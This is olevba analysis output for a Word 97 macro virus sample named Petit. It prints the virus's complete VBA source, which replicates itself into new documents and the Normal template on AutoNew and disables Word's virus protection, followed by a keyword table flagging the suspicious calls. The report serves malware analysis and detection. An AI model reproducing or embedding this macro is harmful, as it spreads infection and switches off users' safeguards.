olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Petit-c78512a619d5ed1900bab51bb8f1949264a79656
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Petit-c78512a619d5ed1900bab51bb8f1949264a79656 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Petit-c78512a619d5ed1900bab51bb8f1949264a79656 - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub AutoNew()
c = VBE.SelectedVBComponent.CodeModule.Lines(1, 13)
With Documents(1).VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString c
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString c
End With
Options.VirusProtection = 0
End Sub
'wm97.Petite by vlam
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

